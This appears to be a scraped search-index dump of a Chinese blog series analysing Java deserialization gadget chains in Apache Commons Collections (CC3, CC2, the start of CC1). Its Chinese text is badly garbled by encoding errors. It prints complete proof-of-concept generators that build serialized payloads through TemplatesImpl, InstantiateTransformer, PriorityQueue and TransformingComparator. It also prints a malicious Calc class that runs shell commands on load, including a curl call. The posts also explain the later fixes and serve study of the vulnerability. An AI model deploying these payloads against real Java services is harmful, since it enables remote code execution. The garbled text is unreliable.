æ˜¯å¯¹å®ƒçš„ç¼ºçœå®ç°ï¼Œä½¿ç”¨è¿‡æ»¤å™¨è¿›è¡Œåº”ç”¨ç¨‹åºå¼€å‘æ—¶ï¼Œåªè¦ç»§æ‰¿ XMLFilterImplï¼Œå°±å¯ä»¥æ–¹ä¾¿çš„å®ç°è‡ªå·±çš„åŠŸèƒ½ã€‚\ncom.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter æ˜¯å¯¹ XMLFilterImpl çš„å®ç°ï¼Œåœ¨å…¶åŸºç¡€ä¸Šæ‰©å±•äº† Templates/TransformerImpl/TransformerHandlerImpl å±æ€§ï¼Œ\nTrAXFilter åœ¨å®ä¾‹åŒ–æ—¶æ¥æ”¶ Templates å¯¹è±¡ï¼Œå¹¶è°ƒç”¨å…¶ newTransformer æ–¹æ³•ï¼Œè¿™å°±å¯ä»¥è§¦å‘æˆ‘ä»¬çš„ TemplatesImpl çš„æ”»å‡» payload äº†ã€‚\nInstantiateTransformer æœ‰äº†ä¸Šè¿° gadget ï¼Œæ¥ä¸‹æ¥çš„é‡ç‚¹å°±æ˜¯éœ€è¦æˆ‘ä»¬å®ä¾‹åŒ–è¿™ä¸ª TrAXFilterï¼Œå®ä¾‹åŒ–æˆ‘ä»¬å½“ç„¶å¯ä»¥ä½¿ç”¨ InvokerTransformer åå°„æ‹¿åˆ° Constructor å† newInstanceï¼Œä½†æ˜¯åŒæ ·åœ°å¯ä»¥ç›´æ¥ä½¿ç”¨å¦å¤–ä¸€ä¸ª Transformerï¼šInstantiateTransformerã€‚\nCommons Collections æä¾›äº† InstantiateTransformer ç”¨æ¥é€šè¿‡åå°„åˆ›å»ºç±»çš„å®ä¾‹ï¼Œå¯ä»¥çœ‹åˆ° transform() æ–¹æ³•å®é™…ä¸Šæ¥æ”¶ä¸€ä¸ª Class ç±»å‹çš„å¯¹è±¡ï¼Œé€šè¿‡ getConstructor è·å–æ„é€ æ–¹æ³•ï¼Œå¹¶é€šè¿‡ newInstance åˆ›å»ºç±»å®ä¾‹ã€‚\nåŒæ—¶ï¼Œæˆ‘ä»¬ä¹Ÿçœ‹ä¸€ä¸‹InstantiateTransformeræ˜¯å¦‚ä½•å®ç°åˆå§‹åŒ–çš„ã€‚\néœ€è¦ä¼ å…¥æ„é€ å™¨çš„å‚æ•°ç±»å‹iParamTypesï¼Œç„¶åä¼ å…¥æ„é€ å™¨çš„å‚æ•°iArgsã€‚\næ”»å‡»æ„é€  ç»“åˆä¸€ä¸‹Gadget,æˆ‘ä»¬å¯ä»¥æ€»ç»“ä»¥ä¸‹æ€è·¯ã€‚\né€šè¿‡ä»£ç†readObjectè§¦å‘å®ƒçš„invokeï¼Œè°ƒç”¨LazyMapçš„getï¼Œå†è°ƒç”¨chainedTransformerï¼Œå®ç°é€šè¿‡InstantiateTransformerå¯¹TrAXFilterè¿›è¡Œå®ä¾‹åŒ–ï¼Œå®ä¾‹åŒ–çš„å‚æ•°ç±»å‹æ˜¯Templates.classï¼Œå‚æ•°æ˜¯templatesImplã€‚TrAXFilterå®ä¾‹åŒ–æ—¶è°ƒç”¨newTransformer æ–¹æ³•ï¼Œè¿™å°±å¯ä»¥è§¦å‘æˆ‘ä»¬çš„ TemplatesImpl çš„æ”»å‡» payload äº†\nPOCéƒ¨åˆ†å’ŒCC1å·®ä¸å¤šäº†ï¼Œä½¿ç”¨LazyMapå¯¹hashMapè¿›è¡ŒåŒ…è£…ï¼›å®ä¾‹åŒ–AnnotationInvocationHandlerï¼Œå¹¶å¯¹å…¶è¿›è¡Œä»£ç†ï¼›é€šè¿‡å®ä¾‹åŒ–å‚æ•°ä¸ºä»£ç†çš„InvocationHandlerï¼Œå¯¹ä»£ç†è¿›è¡ŒåŒ…è£…ã€‚ æœ€ååºåˆ—åŒ–ã€‚\nä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 public class CC3 { public static String fileName = \u0026#34;CC3.bin\u0026#34;; public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InvocationTargetException, InstantiationException { // è¯»å–æ¶æ„ç±» bytes[] InputStream inputStream = CC3.class.getResourceAsStream(\u0026#34;EvilClassForCC3.class\u0026#34;); byte[] bytes = new byte[inputStream.available()]; inputStream.read(bytes); // åˆå§‹åŒ– TemplatesImpl å¯¹è±¡ TemplatesImpl tmpl = new TemplatesImpl(); Field bytecodes = TemplatesImpl.class.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); bytecodes.setAccessible(true); bytecodes.set(tmpl, new byte[][]{bytes}); // _name ä¸èƒ½ä¸ºç©º Field name = TemplatesImpl.class.getDeclaredField(\u0026#34;_name\u0026#34;); name.setAccessible(true); name.set(tmpl, \u0026#34;reus09\u0026#34;); // ç»“åˆ ChainedTransformer ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{tmpl}) }); // åˆå§‹åŒ– LazyMap Map lazyMap = LazyMap.decorate(new HashMap(), chain); Class\u0026lt;?\u0026gt; c = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor\u0026lt;?\u0026gt; constructor = c.getDeclaredConstructors()[0]; constructor.setAccessible(true); // åˆ›å»ºæºå¸¦ç€ LazyMap çš„ AnnotationInvocationHandler å®ä¾‹ InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap); // åˆ›å»ºLazyMapçš„åŠ¨æ€ä»£ç†ç±»å®ä¾‹ Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler); // ä½¿ç”¨åŠ¨æ€ä»£ç†åˆå§‹åŒ– AnnotationInvocationHandler InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, mapProxy); SerializeUtil.writeObjectToFile(invocationHandler, fileName); //\tSerializeUtil.readFileObject(fileName); } } æ”»å‡»ç»“æœï¼š\næ€»ç»“ ä»¥ä¸Šå°±æ˜¯ CC3 é“¾åˆ†æçš„å…¨éƒ¨å†…å®¹äº†ï¼Œæœ€åæ€»ç»“ä¸€ä¸‹ã€‚\nåˆ©ç”¨è¯´æ˜ï¼š åˆ©ç”¨ AnnotationInvocationHandler åœ¨ååºåˆ—åŒ–æ—¶ä¼šè§¦å‘ Map çš„ get/set ç­‰æ“ä½œï¼Œé…åˆ LazyMap åœ¨æ‰§è¡Œ Map å¯¹è±¡çš„æ“ä½œæ—¶ä¼šæ ¹æ®ä¸åŒæƒ…å†µè°ƒç”¨ Transformer çš„è½¬æ¢æ–¹æ³•ï¼Œåˆ©ç”¨äº† InstantiateTransformer å®ä¾‹åŒ– TrAXFilter ç±»ï¼Œå¹¶è°ƒç”¨ TemplatesImpl çš„ newTransformer æ–¹æ³•å®ä¾‹åŒ–æ¶æ„ç±»å­—èŠ‚ç è§¦å‘æ¼æ´ã€‚ Gadget æ€»ç»“ï¼š kick-off gadgetï¼šsun.reflect.annotation.AnnotationInvocationHandler#readObject() sink gadgetï¼šcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer() chain gadgetï¼šorg.apache.commons.collections.functors.InstantiateTransformer#transform() è°ƒç”¨é“¾å±•ç¤ºï¼š 1 2 3 4 5 6 7 8 AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InstantiateTransformer.transform() TemplatesImpl.newTransformer() ä¾èµ–ç‰ˆæœ¬\ncommons-collections : 3.1ï½3.2.1 jdk \u0026lt; 7u21\n","permalink":"http://www.reus09.top/posts/tech/commonscollections3%E5%88%86%E6%9E%90/","summary":"å› æœ‰äº‹è€½æäº†ä¸€å¤©ï¼Œä»Šå¤©ç»§ç»­CommonsCollection3é“¾çš„å­¦ä¹ ã€‚ CC3 å®˜æ–¹æè¿°ä¸º CC1 çš„å˜ç§ï¼Œå…¶ä¸­èƒ½çœ‹åˆ° CC1 å’Œ CC2 çš„éƒ¨åˆ†å½±å­ï¼Œä½†æ˜¯éƒ¨åˆ†æŠ€æœ¯ç»†èŠ‚å¹¶","title":"CommonsCollections3åˆ†æ"},{"content":"å­¦ä¹ å®ŒCommonCollections1é“¾ä¹‹åï¼Œå¾ˆè‡ªç„¶çš„å­¦ä¹ äº†CommonCollection2ï¼Œä½†æ˜¯CC2é“¾çš„ä¾èµ–ç‰ˆæœ¬è¾ƒä¸ºå›ºå®šï¼Œä¸ºcommcons-collections4 4.0ã€‚\nåœ¨2015å¹´åº•commons-collectionsååºåˆ—åŒ–åˆ©â½¤é“¾è¢«æå‡ºæ—¶ï¼ŒApache Commons Collectionsæœ‰ä»¥ä¸‹ä¸¤ä¸ªåˆ†â½€ç‰ˆæœ¬ï¼š\ncommons-collections:commons-collections org.apache.commons:commons-collections4 å¯â»…ï¼ŒgroupIdå’ŒartifactIdéƒ½å˜äº†ã€‚å®˜â½…è®¤ä¸ºæ—§çš„commons-collectionsæœ‰â¼€äº›æ¶æ„å’ŒAPIè®¾è®¡ä¸Šçš„é—®é¢˜ï¼Œä½†ä¿®å¤è¿™äº›é—®é¢˜ï¼Œä¼šäº§â½£â¼¤é‡ä¸èƒ½å‘å‰å…¼å®¹çš„æ”¹åŠ¨ã€‚æ‰€ä»¥ï¼Œcommons-collections4ä¸å†è®¤ä¸ºæ˜¯â¼€ä¸ªâ½¤æ¥æ›¿æ¢commons-collectionsçš„æ–°ç‰ˆæœ¬ï¼Œâ½½æ˜¯â¼€ä¸ªæ–°çš„åŒ…ï¼Œä¸¤è€…çš„å‘½åç©ºé—´ä¸å†²çªï¼Œå› æ­¤å¯ä»¥å…±å­˜åœ¨åŒâ¼€ä¸ªé¡¹â½¬ä¸­ã€‚ å…¶ä¸­LazyMapè¢«æ”¹åä¸ºlazyMapï¼Œæ‰€ä»¥3.2.1ä¸­å­˜åœ¨ååºåˆ—åŒ–åˆ©â½¤é“¾ä¿®æ”¹ä¸€ä¸‹è¿˜æ˜¯å¯ä»¥ç”¨åœ¨4.0ç‰ˆæœ¬ä¸­çš„ã€‚\nå‰ç½®çŸ¥è¯† è€è§„çŸ©ï¼Œåœ¨å­¦ä¹ CC2é“¾ä¹‹å‰ï¼Œå…ˆå­¦ä¹ ä¸€ä¸‹Gadgetä¸­ä¼šç”¨åˆ°çš„ä¸€äº›åŸºç¡€çŸ¥è¯†ã€‚\nPriorityQueue PriorityQueue ä¼˜å…ˆçº§é˜Ÿåˆ—æ˜¯åŸºäºä¼˜å…ˆçº§å †ï¼ˆa priority heapï¼‰çš„ä¸€ç§ç‰¹æ®Šé˜Ÿåˆ—ï¼Œä»–ç»™æ¯ä¸ªå…ƒç´ å®šä¹‰â€œä¼˜å…ˆçº§â€ï¼Œè¿™æ ·å–å‡ºæ•°æ®çš„æ—¶å€™ä¼šæŒ‰ç…§ä¼˜å…ˆçº§æ¥å–ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œä¼˜å…ˆçº§é˜Ÿåˆ—ä¼šæ ¹æ®è‡ªç„¶é¡ºåºå¯¹å…ƒç´ è¿›è¡Œæ’åºã€‚\nå› æ­¤ï¼Œæ”¾å…¥PriorityQueueçš„å…ƒç´ ï¼Œå¿…é¡»å®ç° Comparable æ¥å£ï¼ŒPriorityQueue ä¼šæ ¹æ®å…ƒç´ çš„æ’åºé¡ºåºå†³å®šå‡ºé˜Ÿçš„ä¼˜å…ˆçº§ã€‚å¦‚æœæ²¡æœ‰å®ç° Comparable æ¥å£ï¼ŒPriorityQueue è¿˜å…è®¸æˆ‘ä»¬æä¾›ä¸€ä¸ªComparatorå¯¹è±¡æ¥åˆ¤æ–­ä¸¤ä¸ªå…ƒç´ çš„é¡ºåºã€‚\nPriorityQueue æ”¯æŒååºåˆ—åŒ–ï¼Œåœ¨é‡å†™çš„ readObject æ–¹æ³•ä¸­ï¼Œå°†æ•°æ®ååºåˆ—åŒ–åˆ° queue ä¸­ä¹‹åï¼Œä¼šè°ƒç”¨ heapify() æ–¹æ³•æ¥å¯¹æ•°æ®è¿›è¡Œæ’åºã€‚\nheapifyæ–¹æ³•è°ƒç”¨siftDownæ–¹æ³•ï¼Œåœ¨comparatorå±æ€§ä¸ä¸ºç©ºçš„æƒ…å†µä¸‹ï¼Œè°ƒç”¨siftDownUsingComparatoræ–¹æ³•ï¼Œ\nåœ¨siftDownUsingComparatoræ–¹æ³•ä¸­ï¼Œä¼šè°ƒç”¨comparatordçš„compare()æ–¹æ³•è¿›è¡Œä¼˜å…ˆçº§çš„æ¯”è¾ƒå’Œæ’åºã€‚\nè¿™æ ·ååºåˆ—åŒ–ä¹‹åçš„ä¼˜å…ˆçº§é˜Ÿåˆ—ï¼Œä¹Ÿæ‹¥æœ‰äº†é¡ºåºã€‚\nTransformingComparator TransformingComparator æ˜¯è§¦å‘è¿™ä¸ªæ¼æ´çš„ä¸€ä¸ªå…³é”®ç‚¹ï¼Œä»–å°† Transformer æ‰§è¡Œç‚¹å’Œ PriorityQueue è§¦å‘ç‚¹è¿æ¥äº†èµ·æ¥ã€‚\nTransformingComparator çœ‹ç±»åå°±ç±»ä¼¼ TransformedMapï¼Œå®é™…ä½œç”¨ä¹Ÿç±»ä¼¼ï¼Œç”¨ Tranformer æ¥è£…é¥°ä¸€ä¸ª Comparatorã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¾…æ¯”è¾ƒçš„å€¼å°†å…ˆä½¿ç”¨ Tranformer è½¬æ¢ï¼Œå†ä¼ é€’ç»™ Comparator æ¯”è¾ƒã€‚\nTransformingComparator åˆå§‹åŒ–æ—¶é…ç½® Transformer å’Œ Comparatorï¼Œå¦‚æœä¸æŒ‡å®š Comparatorï¼Œåˆ™ä½¿ç”¨ ComparableComparator.\u0026lt;Comparable\u0026gt;comparableComparator()ã€‚\nç„¶ååˆ†æè¯¥Comparatorçš„compareæ–¹æ³•å®ç°äº†ï¼Œå¯ä»¥çœ‹åˆ°è°ƒç”¨äº† this.transformer.transform() æ–¹æ³•å¯¹è¦æ¯”è¾ƒçš„ä¸¤ä¸ªå€¼è¿›è¡Œè½¬æ¢ï¼Œç„¶åå†è°ƒç”¨ compare æ–¹æ³•æ¯”è¾ƒï¼Œåœ¨å†…éƒ¨è°ƒç”¨å…¶ä¼ å…¥çš„transformerçš„transformæ–¹æ³•ï¼Œå®ç°äº†ä¸CC1é“¾çš„è”ç³»ã€‚\nTemplatesImpl å…³äº TemplatesImpl çš„ååºåˆ—åŒ–è§¦å‘æ–¹å¼ï¼Œåœ¨æˆ‘ä¹‹å‰çš„ fastjson1.2.24 TemplatesImplé“¾çš„æ–‡ç« ä¸­æœ‰æè¿°ï¼Œè¿™é‡Œä¸å†å ç”¨ç¯‡å¹…ï¼Œç®€å•æ€»ç»“ä¸€ä¸‹å°±æ˜¯ï¼š\nTemplatesImpl çš„å±æ€§ _bytecodes å­˜å‚¨äº†ç±»å­—èŠ‚ç  TemplatesImpl ç±»çš„éƒ¨åˆ†æ–¹æ³•å¯ä»¥ä½¿ç”¨è¿™ä¸ªç±»å­—èŠ‚ç å»å®ä¾‹åŒ–è¿™ä¸ªç±»ï¼Œè¿™ä¸ªç±»çš„çˆ¶ç±»éœ€æ˜¯ AbstractTranslet åœ¨è¿™ä¸ªç±»çš„æ— å‚æ„é€ æ–¹æ³•æˆ–é™æ€ä»£ç å—ä¸­å†™å…¥æ¶æ„ä»£ç ï¼Œå†å€Ÿ TemplatesImpl ä¹‹æ‰‹å®ä¾‹åŒ–è¿™ä¸ªç±»è§¦å‘æ¶æ„ä»£ç  æ”»å‡»æ„é€  æ”»å‡»æµç¨‹å¾ˆç®€å•ï¼Œå°±æ˜¯é€šè¿‡PriorityQueueæ¥åŠ å…¥ä¸€ä¸ªTransformingComparatorï¼Œè¿™ä¸ªTransformingComparatorä¼ å…¥äº†æˆ‘ä»¬å®ç°æ„é€ å¥½çš„æ¶æ„ChainTransformeré“¾ã€‚\næ¶æ„ä»£ç å¦‚ä¸‹:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 package CC2; import Util.SeralizeUtil; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.IOException; import java.lang.reflect.Field; import java.util.PriorityQueue; /** * @ClassName CC2WithChain * @Description TODO * @Author reus09 * @Date 2022/10/25 18:32 * @Version 1.0 **/ public class CC2WithChain { public static String fileName = \u0026#34;CC2WithChain.bin\u0026#34;; public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, IOException, IOException { // åˆå§‹åŒ– Transformer ChainedTransformer chain = new ChainedTransformer(new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;open -a Calculator.app\u0026#34;}) ); TransformingComparator comparator = new TransformingComparator(chain); // åœ¨åˆå§‹åŒ–æ—¶ä¸å¸¦å…¥ comparatorï¼Œè€Œæ˜¯ PriorityQueue\u0026lt;String\u0026gt; queue = new PriorityQueue\u0026lt;\u0026gt;(2); queue.add(\u0026#34;1\u0026#34;); queue.add(\u0026#34;2\u0026#34;); Field field = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;comparator\u0026#34;); field.setAccessible(true); field.set(queue, comparator); SeralizeUtil.writeObjectToFile(queue, fileName); SeralizeUtil.readFileObject(fileName); } } è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨åˆå§‹åŒ–PriorityQueueæ—¶æ²¡æœ‰æŒ‡å®š comparatorï¼Œè€Œæ˜¯ä½¿ç”¨åå°„å†™å…¥ï¼Œè¿™æ˜¯ä¸ºäº†é¿å…åœ¨å‘ queue ä¸­æ·»åŠ å†…å®¹æ—¶è§¦å‘æ’åºè€Œå¯¼è‡´è§¦å‘æ¶æ„ payloadã€‚\nå¼¹è®¡ç®—å™¨:\nysoserialçš„CC2é“¾ ysoserial çš„ CC2 æ²¡æœ‰ä½¿ç”¨ ChainedTransformerï¼Œè€Œç›´æ¥ä½¿ç”¨äº† InvokerTransformer é…åˆ TemplatesImpl ç›´æ¥åŠ è½½æ¶æ„ç±»çš„ bytecodeã€‚\nè§¦å‘é€»è¾‘ä¸ºï¼š\nåˆ›å»ºæ¶æ„çš„ TemplatesImpl å¯¹è±¡ï¼Œå†™å…¥ _bytecodesã€_name å±æ€§ï¼Œå®Œæˆè°ƒç”¨newTransformeræ–¹æ³•è§¦å‘æ¶æ„ç±»çš„å®ä¾‹åŒ–çš„æ¡ä»¶ã€‚ åˆ›å»º PriorityQueueï¼Œç”±äº TemplatesImpl ä¸æ˜¯ Comparable å¯¹è±¡ï¼Œéœ€è¦åå°„å°†æ¶æ„çš„ TemplatesImpl å¯¹è±¡å†™å…¥åˆ° PriorityQueue çš„ queue ä¸­ã€‚ ä½¿ç”¨InvokerTransformerï¼ˆè°ƒç”¨è¢«è£…é¥°å¯¹è±¡çš„ newTransformer æ–¹æ³•ï¼‰åˆ›å»º TransformingComparator ï¼Œå¹¶å°†å…¶èµ‹äºˆåˆ° PriorityQueue ä¸­ã€‚ æ€»ç»“ä¸€ä¸‹å°±æ˜¯ï¼Œåœ¨PriorityQueueä¸­æ”¾å…¥ä¸€ä¸ªtemplatesImplå¯¹è±¡(å·²ç»åœ¨é‡Œé¢æ³¨å…¥æ¶æ„ä»£ç ç±»),ç„¶åå£°æ˜ä¸€ä¸ªTransformingComparatorï¼Œé‡Œé¢åˆå§‹åŒ–çš„Transfoermerä¸ºInvokeTransformer,InvokeTransformeré‡Œé¢æ‰§è¡Œçš„æ–¹æ³•ä¸ºtemplatesImplå¯¹è±¡çš„newTransformer()æ–¹æ³•ï¼Œåœ¨newTransformeræ–¹æ³•é‡Œé¢å®ç°æ¶æ„ç±»çš„å®ä¾‹åŒ–ã€‚\næœ€ç»ˆä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 public class CC2WithTemplatesImpl { public static String fileName = \u0026#34;CC2WithTemplatesImpl.bin\u0026#34;; public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException { // è¯»å–æ¶æ„ç±» bytes[] InputStream inputStream = CC2WithTemplatesImpl.class.getResourceAsStream(\u0026#34;Calc.class\u0026#34;); byte[] bytes = new byte[inputStream.available()]; inputStream.read(bytes); // åˆå§‹åŒ– PriorityQueue PriorityQueue\u0026lt;Object\u0026gt; queue = new PriorityQueue\u0026lt;\u0026gt;(2); queue.add(\u0026#34;1\u0026#34;); queue.add(\u0026#34;2\u0026#34;); // åˆå§‹åŒ– TemplatesImpl å¯¹è±¡ TemplatesImpl tmpl = new TemplatesImpl(); Field bytecodes = TemplatesImpl.class.getDeclaredField(\u0026#34;_bytecodes\u0026#34;); bytecodes.setAccessible(true); bytecodes.set(tmpl, new byte[][]{bytes}); // _name ä¸èƒ½ä¸ºç©º Field name = TemplatesImpl.class.getDeclaredField(\u0026#34;_name\u0026#34;); name.setAccessible(true); name.set(tmpl, \u0026#34;reus09\u0026#34;); Field field = PriorityQueue.class.getDeclaredField(\u0026#34;queue\u0026#34;); field.setAccessible(true); Object[] objects = (Object[]) field.get(queue); objects[0] = tmpl; // ç”¨ InvokerTransformer æ¥åå°„è°ƒç”¨ TemplatesImpl çš„ newTransformer æ–¹æ³• // è¿™ä¸ªç±»æ˜¯ public çš„ï¼Œæ–¹ä¾¿è°ƒç”¨ Transformer transformer = new InvokerTransformer(\u0026#34;newTransformer\u0026#34;, new Class[]{}, new Object[]{}); TransformingComparator comparator = new TransformingComparator(transformer); Field field2 = Class.forName(\u0026#34;java.util.PriorityQueue\u0026#34;).getDeclaredField(\u0026#34;comparator\u0026#34;); field2.setAccessible(true); field2.set(queue, comparator); SerializeUtil.writeObjectToFile(queue, fileName); SerializeUtil.readFileObject(fileName); } } ç¼–å†™ä¸€ä¸ªæ¶æ„çš„Calcç±»ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 package CC2; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.IOException; /** * @ClassName Calc * @Description TODO * @Author reus09 * @Date 2022/10/21 19:43 * @Version 1.0 **/ public class Calc extends AbstractTranslet { static { String command = \u0026#34;open -a Calculator.app\u0026#34;; String osName = System.getProperty(\u0026#34;os.name\u0026#34;); if (osName.startsWith(\u0026#34;Windows\u0026#34;)) { command = \u0026#34;calc 12345678901234567\u0026#34;; } else if (osName.startsWith(\u0026#34;Linux\u0026#34;)) { command = \u0026#34;curl localhost:9999/\u0026#34;; } try { Runtime.getRuntime().exec(command); } catch (IOException e) { e.printStackTrace(); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } ysoserial çš„ CC2 è¿è¡Œæ•ˆæœï¼š\næ€»ç»“ åˆ©ç”¨è¯´æ˜ï¼š\nåˆ©ç”¨ PriorityQueue åœ¨ååºåˆ—åŒ–åä¼šå¯¹é˜Ÿåˆ—è¿›è¡Œä¼˜å…ˆçº§æ’åºçš„ç‰¹ç‚¹ï¼Œä¸ºå…¶æŒ‡å®š TransformingComparator æ’åºæ–¹æ³•ï¼Œå¹¶åœ¨å…¶ä¸­ä¸ºå…¶æ·»åŠ  Transforerï¼Œä¸ CC1 ç±»ä¼¼ï¼Œä¸»è¦çš„è§¦å‘ä½ç½®è¿˜æ˜¯ InvokerTransformerã€‚ Gadget æ€»ç»“ï¼š\nkick-off gadgetï¼šjava.util.PriorityQueue#readObject() sink gadgetï¼šcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer() chain gadgetï¼šorg.apache.commons.collections4.comparators.TransformingComparator#compare() è°ƒç”¨é“¾å±•ç¤º\nysoserialçš„CC2é“¾ 1 2 3 4 5 PriorityQueue.readObject() TransformingComparator.compare() *ChainedTransformer.transform() InvokerTransformer.transform() TemplatesImpl.newTransformer() PriorityQueueçš„åˆ©â½¤é“¾ä¸â½€æŒåœ¨commons-collections 3ä¸­ä½¿â½¤ã€‚ å› ä¸ºç±» org.apache.commons.collections4.comparators.TransformingComparator åœ¨commonscollections4.0ä»¥å‰æ˜¯ç‰ˆæœ¬ä¸­æ˜¯æ²¡æœ‰å®ç° Serializable æ¥â¼çš„ï¼Œâ½†æ³•åœ¨åºåˆ—åŒ–ä¸­ä½¿â½¤ã€‚\nä¿®å¤3.2.2 æ–°ç‰ˆä»£ç ä¸­å¢åŠ äº†â¼€ä¸ªâ½…æ³•FunctorUtils#checkUnsafeSerialization ï¼Œâ½¤äºæ£€æµ‹ååºåˆ—åŒ–æ˜¯å¦å®‰å…¨ã€‚å¦‚æœå¼€å‘è€…æ²¡æœ‰è®¾ç½®å…¨å±€é…ç½® org.apache.commons.collections.enableUnsafeSerialization=true ï¼Œå³é»˜è®¤æƒ…å†µä¸‹ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚ è¿™ä¸ªæ£€æŸ¥åœ¨å¸¸â»…çš„å±é™©Transformerç±»ï¼ˆ InstantiateTransformer ã€ InvokerTransformer ã€ PrototypeFactory ã€ CloneTransformer ç­‰ï¼‰çš„ readObject â¾¥è¿›â¾è°ƒâ½¤ï¼Œæ‰€ä»¥ï¼Œå½“æˆ‘ä»¬ååºåˆ—åŒ–åŒ…å«è¿™äº›å¯¹è±¡æ—¶å°±ä¼šæŠ›å‡ºâ¼€ä¸ªå¼‚å¸¸ï¼š\n1 2 3 4 Serialization support for org.apache.commons.collections.functors.InvokerTransformer is disabled for security reasons. To enable it set system property \u0026#39;org.apache.commons.collections.enableUnsafeSerialization\u0026#39; to \u0026#39;true\u0026#39;, but you must ensure that your application does not de-serialize objects from untrusted sources. 4.1â¾¥ï¼Œè¿™â¼ä¸ªå±é™©Transformerç±»ä¸å†å®ç° Serializable æ¥â¼ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä»–ä»¬â¼ä¸ªå½»åº•â½†æ³•åºåˆ—åŒ–å’Œååºåˆ—åŒ–äº†ã€‚\nä¾èµ–ç‰ˆæœ¬\ncommons-collections4 : 4.0\n","permalink":"http://www.reus09.top/posts/tech/commonscollections2%E5%88%86%E6%9E%90/","summary":"å­¦ä¹ å®ŒCommonCollections1é“¾ä¹‹åï¼Œå¾ˆè‡ªç„¶çš„å­¦ä¹ äº†CommonCollection2ï¼Œä½†æ˜¯CC2é“¾çš„ä¾èµ–ç‰ˆæœ¬è¾ƒä¸ºå›ºå®šï¼Œä¸ºcom","title":"CommonsCollections2åˆ†æ"},{"content":"Apache Commons Collections æ˜¯ä¸€ä¸ªæ‰©å±•äº† Java æ ‡å‡†åº“é‡Œçš„ Collection ç»“æ„çš„ç¬¬ä¸‰æ–¹åŸºç¡€åº“ï¼Œå®ƒæä¾›äº†å¾ˆå¤šå¼ºæœ‰åŠ›çš„æ•°æ®ç»“æ„ç±»å‹å¹¶å®ç°äº†å„ç§é›†åˆå·¥å…·ç±»ã€‚ä½œä¸º Apache å¼€æºé¡¹ç›®çš„é‡è¦ç»„ä»¶ï¼Œè¢«å¹¿æ³›è¿ç”¨äºå„ç§ Java åº”ç”¨çš„å¼€å‘ã€‚\nä»æœ¬æ–‡å¼€å§‹æ­£å¼å¯¹CommonsCollectionsååºåˆ—åŒ–é“¾è¿›è¡Œå­¦ä¹ ï¼Œç¬¬ä¸€ç¯‡æ–‡ç« ä¸»è¦åˆ†æä¸€ä¸‹CommonsCollections1è¿™æ¡é“¾ï¼Œé€šè¿‡å¯¹CommonsCollections1é“¾çš„å­¦ä¹ ï¼Œå­¦åˆ°äº†TransformedMapå’ŒLazyMapçš„ä¸€äº›ç”¨æ³•ï¼ŒåŒ…æ‹¬Transformerçš„ä¸€äº›å®ç°ç±»ï¼Œæœ€åè¿˜æœ‰CommonsCollections1é“¾çš„æ„é€ åŸç†ã€‚\nå‰ç½®çŸ¥è¯† è·Ÿéšsu18å¸ˆå‚…çš„åšå®¢ï¼Œæˆ‘ä»¬é¦–å…ˆå¯¹CommonsCollections1é“¾ä¸­è¦ç”¨åˆ°çš„ä¸€äº›åŸºç¡€çŸ¥è¯†è¿›è¡Œå­¦ä¹ ã€‚\nAbstractMapDecorator 